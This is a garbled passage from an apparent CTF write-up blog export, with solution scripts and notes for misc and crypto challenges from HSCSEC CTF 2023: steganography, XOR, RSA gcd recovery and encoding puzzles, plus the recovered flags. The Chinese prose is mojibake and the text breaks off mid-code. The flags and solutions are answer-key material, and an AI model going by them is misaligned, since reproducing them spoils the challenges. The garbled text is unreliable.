&quot;d83d,de1c&quot;, &quot;d83d,de28&quot;, &quot;d83d,de07&quot;, &quot;d83d,de01&quot;, &quot;d83d,de19&quot;, &quot;d83d,de22&quot;, &quot;d83d,de06&quot;, &quot;d83d,de09&quot;, &quot;d83d,de04&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de20&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de1a&quot; ], [ &quot;d83d,de03&quot;, &quot;d83d,de11&quot;, &quot;d83d,de26&quot;, &quot;d83d,de02&quot;, &quot;d83d,de06&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de25&quot;, &quot;d83d,de20&quot;, &quot;d83d,de03&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de05&quot;, &quot;d83d,de10&quot;, &quot;d83d,de09&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de12&quot;, &quot;d83d,de01&quot;, &quot;d83d,de06&quot;, &quot;d83d,de09&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de19&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de05&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de17&quot;, &quot;d83d,de10&quot;, &quot;d83d,de20&quot;, &quot;d83d,de26&quot;, &quot;d83d,de05&quot;, &quot;d83d,de09&quot;, &quot;d83d,de25&quot;, &quot;d83d,de16&quot;, &quot;d83d,de17&quot;, &quot;d83d,de09&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de18&quot; ], [ &quot;d83d,de13&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de09&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de13&quot;, &quot;d83d,de13&quot;, &quot;d83d,de19&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de07&quot;, &quot;d83d,de14&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de08&quot;, &quot;d83d,de01&quot;, &quot;d83d,de15&quot;, &quot;d83d,de14&quot;, &quot;d83d,de20&quot;, &quot;d83d,de27&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de23&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de29&quot;, &quot;d83d,de12&quot;, &quot;d83d,de21&quot;, &quot;d83d,de13&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de07&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de03&quot;, &quot;d83d,de23&quot;, &quot;d83d,de29&quot;, &quot;d83d,de21&quot;, &quot;d83d,de12&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de23&quot;, &quot;d83d,de01&quot;, &quot;d83d,de11&quot; ], [ &quot;d83d,de27&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de19&quot;, &quot;d83d,de11&quot;, &quot;d83d,de11&quot;, &quot;d83d,de23&quot;, &quot;d83d,de03&quot;, &quot;d83d,de26&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de09&quot;, &quot;d83d,de20&quot;, &quot;d83d,de02&quot;, &quot;d83d,de13&quot;, &quot;d83d,de10&quot;, &quot;d83d,de01&quot;, &quot;d83d,de27&quot;, &quot;d83d,de15&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de04&quot;, &quot;d83d,de14&quot;, &quot;d83d,de02&quot;, &quot;d83d,de01&quot;, &quot;d83d,de15&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de00&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de16&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de24&quot; ], [ &quot;d83d,de03&quot;, &quot;d83d,de09&quot;, &quot;d83d,de15&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de01&quot;, &quot;d83d,de20&quot;, &quot;d83d,de10&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de15&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de08&quot;, &quot;d83d,de22&quot;, &quot;d83d,de27&quot;, &quot;d83d,de05&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de20&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de22&quot;, &quot;d83d,de15&quot;, &quot;d83d,de29&quot;, &quot;d83d,de22&quot;, &quot;d83d,de27&quot;, &quot;d83d,de02&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de04&quot;, &quot;d83d,de14&quot;, &quot;d83d,de06&quot;, &quot;d83d,de11&quot;, &quot;d83d,de18&quot;, &quot;d83d,de25&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de14&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de2f&quot; ], [ &quot;d83d,de2e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de10&quot;, &quot;d83d,de14&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de11&quot;, &quot;d83d,de08&quot;, &quot;d83d,de11&quot;, &quot;d83d,de06&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de28&quot;, &quot;d83d,de14&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de20&quot;, &quot;d83d,de21&quot;, &quot;d83d,de27&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de17&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de29&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de24&quot;, &quot;d83d,de08&quot;, &quot;d83d,de20&quot;, &quot;d83d,de16&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de20&quot;, &quot;d83d,de18&quot;, &quot;d83d,de29&quot;, &quot;d83d,de02&quot;, &quot;d83d,de05&quot;, &quot;d83d,de03&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1c&quot; ], [ &quot;d83d,de04&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de10&quot;, &quot;d83d,de15&quot;, &quot;d83d,de02&quot;, &quot;d83d,de27&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de12&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de25&quot;, &quot;d83d,de04&quot;, &quot;d83d,de00&quot;, &quot;d83d,de09&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de04&quot;, &quot;d83d,de16&quot;, &quot;d83d,de03&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de11&quot;, &quot;d83d,de23&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de27&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de11&quot;, &quot;d83d,de00&quot;, &quot;d83d,de07&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de14&quot;, &quot;d83d,de01&quot;, &quot;d83d,de05&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de24&quot;, &quot;d83d,de07&quot; ], [ &quot;d83d,de16&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de08&quot;, &quot;d83d,de17&quot;, &quot;d83d,de12&quot;, &quot;d83d,de05&quot;, &quot;d83d,de03&quot;, &quot;d83d,de23&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de02&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de16&quot;, &quot;d83d,de08&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de16&quot;, &quot;d83d,de05&quot;, &quot;d83d,de03&quot;, &quot;d83d,de14&quot;, &quot;d83d,de17&quot;, &quot;d83d,de15&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de02&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de04&quot;, &quot;d83d,de03&quot;, &quot;d83d,de01&quot;, &quot;d83d,de13&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de09&quot;, &quot;d83d,de15&quot;, &quot;d83d,de23&quot;, &quot;d83d,de07&quot;, &quot;d83d,de20&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de16&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2f&quot; ], [ &quot;d83d,de0f&quot;, &quot;d83d,de13&quot;, &quot;d83d,de11&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de06&quot;, &quot;d83d,de16&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de16&quot;, &quot;d83d,de05&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de09&quot;, &quot;d83d,de07&quot;, &quot;d83d,de04&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de11&quot;, &quot;d83d,de13&quot;, &quot;d83d,de29&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de13&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de00&quot;, &quot;d83d,de25&quot;, &quot;d83d,de14&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de17&quot;, &quot;d83d,de27&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de09&quot;, &quot;d83d,de29&quot;, &quot;d83d,de17&quot;, &quot;d83d,de02&quot;, &quot;d83d,de24&quot;, &quot;d83d,de11&quot; ], [ &quot;d83d,de2e&quot;, &quot;d83d,de00&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de17&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de29&quot;, &quot;d83d,de20&quot;, &quot;d83d,de26&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de23&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de02&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de01&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de17&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de10&quot;, &quot;d83d,de03&quot;, &quot;d83d,de27&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de25&quot;, &quot;d83d,de08&quot;, &quot;d83d,de28&quot;, &quot;d83d,de13&quot;, &quot;d83d,de29&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de02&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de13&quot;, &quot;d83d,de27&quot;, &quot;d83d,de00&quot;, &quot;d83d,de27&quot; ], [ &quot;d83d,de2d&quot;, &quot;d83d,de04&quot;, &quot;d83d,de10&quot;, &quot;d83d,de20&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de17&quot;, &quot;d83d,de04&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de24&quot;, &quot;d83d,de00&quot;, &quot;d83d,de08&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de21&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de09&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de27&quot;, &quot;d83d,de22&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de20&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de09&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de03&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de28&quot;, &quot;d83d,de14&quot;, &quot;d83d,de13&quot;, &quot;d83d,de20&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de10&quot;, &quot;d83d,de21&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de07&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de25&quot; ]]print(len(s))num = [25588, 31114, 28727, 26722, 24948, 25135, 25480, 29029, 23025, 25775, 15411, 25423, 25202, 30031, 27380, 30734, 25054, 25109, 20741, 28568, 28802, 24591, 26063, 30940, 30375, 19411, 29573, 20845, 27232, 26743, 25779, 24986, 31498, 30978, 22945, 26563, 35012, 29994, 27016, 29535, 21342, 26573, 27569, 25408, 31567, 25503, 21385, 27207]dic = &#123;&#125;for i in range(48): for j in range(48): k = s[i][j] if k not in dic: dic[k] = [] dic[k].append((i,j))for k,v in dic.items(): x,y=k.split(&#x27;,&#x27;) x=int(x,16) y=int(y,16) z=(x - 55296) * 1024 + y - 56320 + 65536 - 128512 for t in v: num[z] -= t[0]*t[1]print(bytes(num))# b&#x27;\\x00\\x00\\x00\\x00\\x00\\x00369d9412-f5c8-4aa4-8056-a7e4369d4555\\x00\\x00\\x00\\x00\\x00\\x00&#x27; flagï¼šflag&#123;369d9412-f5c8-4aa4-8056-a7e4369d4555&#125;ã€‚ â€‹ PWNæ— ","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023èµ›","slug":"2023èµ›","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HSCSEC CTF 2023 (HSC-2th 2023)","slug":"match-HSCSEC-CTF-2023","date":"2023-02-12T14:23:55.000Z","updated":"2023-02-12T16:47:31.210Z","comments":true,"path":"2023/02/12/match-HSCSEC-CTF-2023/","permalink":"https://lazzzaro.github.io/2023/02/12/match-HSCSEC-CTF-2023/","excerpt":"","text":"â€‹ 2023/02/11 00:00 UTC+8 - 2023/02/12 23:59 UTC+8 æœ¬å±ŠHSC-2th 2023æ˜¯ç”±ä¸­é¾™æŠ€æœ¯è”åˆç¤¾ä¼šæˆ˜é˜Ÿçº¢å®¢çªå‡»é˜Ÿï¼ˆHSCSECï¼‰ä¸¾åŠã€‚ æœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨åœ¨çº¿ç½‘ç»œå®‰å…¨å¤ºæ——æŒ‘æˆ˜èµ›çš„å½¢å¼ï¼Œæ¶µç›–web,crypto,misc,reverse,pwnç­‰ä¸»æµæ–¹å‘ï¼Œå¹¶é¢å‘å…¨çƒå¼€æ”¾ã€‚æ¯”èµ›ä¸‰ç”²å¯è·çªå‡»é˜Ÿå‘¨è¾¹ç¤¼å“ã€‚å‰ååå¯è·å¾—åˆä½œä¼™ä¼´èµåŠ©ç¤¼å“ä»¥åŠå®ä½“è¯ä¹¦ã€‚ Rank: 1 MISCSIGNIN å…³æ³¨å…¬ä¼—å·ï¼šä¸­é¾™ çº¢å®¢çªå‡»é˜Ÿ å‘é€ï¼šHSCCTF{TELLMEFLAG}è·å–flagï¼ å…¬ä¼—å·ç­¾åˆ°ï¼ŒHSCSEC&#123;W3Ic0m3_t0_HScCtF2tH&#125;ã€‚ â€‹ LINUX flag2ä¸ºç”¨æˆ·ç™»å½•çš„å¯†ç ä¸‹è½½ï¼šç™¾åº¦ç½‘ç›˜ï¼šhttps://pan.baidu.com/s/1RMGpG391HbgWfOhwYmWx0A?pwd=HSC2æå–ç ï¼šHSC2è…¾è®¯ç½‘ç›˜ï¼šhttps://share.weiyun.com/EyhLtHnFå¯†ç ï¼šjyk6t9å¥¶ç‰›å¿«ä¼ ï¼š https://cowtransfer.com/s/d83e0de581aa49 ç‚¹å‡»é“¾æ¥æŸ¥çœ‹ [ LINUX.rar ] ï¼Œæˆ–è®¿é—®å¥¶ç‰›å¿«ä¼  cowtransfer.com è¾“å…¥ä¼ è¾“å£ä»¤ xgzg82 æŸ¥çœ‹ï¼› éé¢„æœŸï¼Œç›´æ¥16è¿›åˆ¶æŸ¥çœ‹æ–‡ä»¶ï¼Œæœå­—ç¬¦ä¸² HSCSEC&#123; å‘ç°ï¼š 123456root@ubuntu:/home/ubuntu/Desktop# history 1 f1aG1:HSCSEC&#123;Lim3_ 2 exit 3 ubuntu20.04 4 historyroot@ubuntu:/home/ubuntu/Desktop# echo &quot;flag3:_iez&#125;&quot; &gt; /f1Ag3 è¿æ¥å¾—flagï¼šHSCSEC&#123;Lim3_ubuntu20.04_iez&#125;ã€‚ â€‹ Saluteè§£å‹å¾—åˆ° encode_salute æ–‡ä»¶ï¼Œå°¾éƒ¨æœ‰ 525d93ceb70e2bf5daa84ec3d0cd2c731aï¼Œmd5æŸ¥è¯¢å¾—æ˜æ–‡ qwer1234ï¼Œä»¥æ­¤ä¸ºå¯†é’¥ä¸æ–‡ä»¶å¼‚æˆ–ï¼Œè¿˜åŸå¾—åˆ°raræ–‡ä»¶ã€‚ æ–‡ä»¶é‡Œä¸€å¼ jpgå›¾ç‰‡ä¸€å¼ pngå›¾ç‰‡ï¼Œç”¨stegsolveæŸ¥çœ‹pngå›¾ç‰‡alpha0é€šé“ï¼Œæœ‰ flag2/key that_is å­—æ ·ã€‚ å†ä»¥æ­¤ä¸ºå¯†ç ï¼Œç”¨steghideæå–jpgå›¾ç‰‡çš„éšè—ä¿¡æ¯ï¼šsteghide extract -sf salute.jpgï¼Œå¾—åˆ°flagæ–‡ä»¶å†…å®¹ flag3:_c0ol&#125;ã€‚ è¿æ¥ä¸ºflagï¼šHSCSEC&#123;qwer1234that_is_c0ol&#125;ã€‚ â€‹ EZIMGpngå›¾ç‰‡å°¾éƒ¨æœ‰01ä¸²+åè½¬çš„pngï¼Œæå–01ä¸²åšäºŒç»´ç å›¾ï¼Œæ‰«å‡ºå†…å®¹ flag2:aQR_c0de_andï¼›åè½¬çš„pngè¿˜åŸä¸ºæ–°pngå›¾ï¼Œåè‰²å¤„ç†å¾—åˆ° HSCSEC&#123;p3G_hã€‚ å°‘äº†ç¬¬ä¸‰éƒ¨åˆ†ï¼Œå¯¹æ–°pngå›¾å°è¯•ä½¿ç”¨PixelJihadè§£å¯†ï¼Œå¾—åˆ° _3nc&#125;ã€‚ è¿æ¥ä¸ºflagï¼šHSCSEC&#123;p3G_haQR_c0de_and_3nc&#125;ã€‚ â€‹ Ancient-MISCDeduced gossip â˜²â˜µ â˜·â˜µâ˜³ â˜¶ç©º â˜·â˜µâ˜³ â˜¶â˜± â˜¶ç©º â˜·ç©ºâ˜± â˜¶ç©º â˜·â˜³â˜° â˜·â˜³â˜± â˜·â˜´â˜³ â˜·â˜³â˜³ â˜·â˜´â˜¶ â˜·â˜³â˜³ â˜·â˜·â˜° â˜·â˜³ç©º â˜°â˜´ â˜·â˜´â˜¶ â˜·â˜´â˜¶ â˜·â˜´ç©º â˜·ç©ºâ˜² çŒœæµ‹ä¸ºå…«å¦+ç©ºä¸€ä¸€å¯¹åº”9ä¸ªæ•°å­—ï¼Œæ ¹æ® HSCSEC&#123;&#125; å¯¹åº”çš„ä¹è¿›åˆ¶æ•°ï¼Œå¯çŸ¥7ä¸ªç¬¦å·å¯¹åº”çš„æ•°ï¼Œå‰©ä¸‹çš„2ä¸ªæµ‹è¯•å³å¯ã€‚ æœ€ç»ˆå¯¹åº” 80 102 74 102 76 74 146 74 125 126 132 122 137 122 115 124 53 137 137 134 148 è½¬æ¢ä¸ºåè¿›åˆ¶ï¼š72 83 67 83 69 67 123 67 104 105 110 101 115 101 95 103 48 115 115 112 125 è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼šHSCSEC&#123;Chinese_g0ssp&#125;ï¼Œè¿˜å¾—æ‰‹åŠ¨è¡¥å…¨å•è¯æ‰æ­£ç¡®â€¦â€¦ flagï¼šHSCSEC&#123;Chinese_g0ssip&#125;ã€‚ â€‹ Watch the sky at night æ–—æœ¨ç¬è§’æœ¨è›Ÿå¥æœ¨ç‹¼äº¢é‡‘é¾™ ç‰›é‡‘ç‰›å¥³åœŸè æ°åœŸè²‰äº•æœ¨çŠ´è™šæ—¥é¼ æˆ¿æ—¥å…”å¿ƒæœˆç‹é¬¼é‡‘ç¾Š å±æœˆç‡•å®¤ç«çŒªå°¾ç«è™æŸ³åœŸçå£æ°´è²ç®•æ°´è±¹æ–—æœ¨ç¬ç‰›é‡‘ç‰› å¥³åœŸè è§’æœ¨è›Ÿäº¢é‡‘é¾™æ˜Ÿæ—¥é©¬è™šæ—¥é¼ å¼ æœˆé¹¿å¨„é‡‘ç‹—ç¿¼ç«è›‡ å±æœˆç‡•æ°åœŸè²‰æˆ¿æ—¥å…”è½¸æ°´èš“å®¤ç«çŒªå¿ƒæœˆç‹äº•æœ¨çŠ´èƒƒåœŸé›‰ å£æ°´è²æ–—æœ¨ç¬é¬¼é‡‘ç¾ŠæŸ³åœŸçç‰›é‡‘ç‰›å°¾ç«è™ç®•æ°´è±¹å¥³åœŸè  è™šæ—¥é¼ æ˜´æ—¥é¸¡æŸ³åœŸçæ¯•æœˆä¹Œå±æœˆç‡•è§œç«çŒ´è§’æœ¨è›Ÿæ˜Ÿæ—¥é©¬ å®¤ç«çŒªå‚æ°´çŒ¿å¥æœ¨ç‹¼å£æ°´è²æ–—æœ¨ç¬å¨„é‡‘ç‹—ç‰›é‡‘ç‰›å¥³åœŸè  è™šæ—¥é¼ èƒƒåœŸé›‰å¼ æœˆé¹¿æ˜´æ—¥é¸¡å±æœˆç‡•ç¿¼ç«è›‡å®¤ç«çŒªäº¢é‡‘é¾™ å£æ°´è²æ–—æœ¨ç¬è½¸æ°´èš“äº•æœ¨çŠ´ç‰›é‡‘ç‰›æ°åœŸè²‰æˆ¿æ—¥å…”å¥³åœŸè  è™šæ—¥é¼ å±æœˆç‡•å¿ƒæœˆç‹å°¾ç«è™å®¤ç«çŒªé¬¼é‡‘ç¾ŠæŸ³åœŸçå£æ°´è² æŸ¥åˆ°æ¯ä¸‰ä¸ªå­—ç»„æˆçš„è¯ä¸º28æ˜Ÿå®¿é‡Œçš„ä¸€ç§ï¼Œä¸”æ ¹æ®æ–¹ä½åˆ†åˆ«å½’ç±»åˆ°é’é¾™ã€ç™½è™ã€æœ±é›€ã€ç„æ­¦å››å¤§ç±»ä¸­ï¼š é’é¾™ï¼šè§’æœ¨è›Ÿã€äº¢é‡‘é¾™ã€æ°åœŸè²‰ã€æˆ¿æ—¥å…”ã€å¿ƒæœˆç‹ã€å°¾ç«è™ã€ç®•æ°´è±¹ç„æ­¦ï¼šæ–—æœ¨ç¬ã€ç‰›é‡‘ç‰›ã€å¥³åœŸè ã€è™šæ—¥é¼ ã€å±æœˆç‡•ã€å®¤ç«çŒªã€å£æ°´è²ç™½è™ï¼šå¥æœ¨ç‹¼ã€å¨„é‡‘ç‹—ã€èƒƒåœŸé›‰ã€æ˜´æ—¥é¸¡ã€æ¯•æœˆä¹Œã€è§œç«çŒ´ã€å‚æ°´çŒ¿æœ±é›€ï¼šäº•æœ¨çŠ´ã€é¬¼é‡‘ç¾Šã€æŸ³åœŸçã€æ˜Ÿæ—¥é©¬ã€å¼ æœˆé¹¿ã€ç¿¼ç«è›‡ã€è½¸æ°´èš“ æŒ‰4è¿›åˆ¶åˆ†åˆ«æ›¿æ¢ä¸º0-3ï¼Œå¾—åˆ° 1020 1103 1003 1103 1011 1003 1323 1003 1032 1133 1001 1232 1203 1221 1211 1232 1310 1133 1001 1100 1331ã€‚ è½¬æ¢ä¸ºåè¿›åˆ¶ï¼š72 83 67 83 69 67 123 67 78 95 65 110 99 105 101 110 116 95 65 80 125 è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼šHSCSEC&#123;CN_Ancient_AP&#125;ã€‚ â€‹ CRYPTOEZRSA 123456789101112131415from Crypto.Util.number import *import gmpy2from flag import mp = getPrime(1024)q = getPrime(1024)n = p * qprint(&#x27;n =&#x27;,n)e = 0x10001M = m * e * 1 * 2022 * pc = pow(M,e,n)print(&#x27;c =&#x27;,c)# n = 16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849# c = 12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411 $c = M^e \\bmod n = (2022mep)^e \\bmod n$ï¼Œä»¤ $câ€™ = c \\cdot (2022e)^{-e} \\bmod n = (mp)^e \\bmod n = (m^ep^{e-1} \\bmod n) \\cdot p$ï¼Œ æ•… $\\gcd(câ€™,n)=p$ï¼Œå†åˆ©ç”¨å¸¸è§„RSAæ±‚è§£ã€‚ 123456789101112n = 16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849c = 12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411e = 0x10001cc = c * inverse_mod(pow(2022*e,e,n),n)p = gcd(cc,n)q = n // pf = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(cc,d,n) // pprint(bytes.fromhex(hex(m)[2:]))# b&#x27;flag&#123;3e5e2789a93a80615cc35edbff397c05&#125;&#x27; â€‹ Operator 1234567891011121314151617#!/bin/python3from Crypto.Util.number import bytes_to_long, getPrimeFLAG = &quot;*******************MASK****************&quot;# print(FLAG)number1 = getPrime(512)number2 = getPrime(1024)print(number1)result = FLAG * number1 % 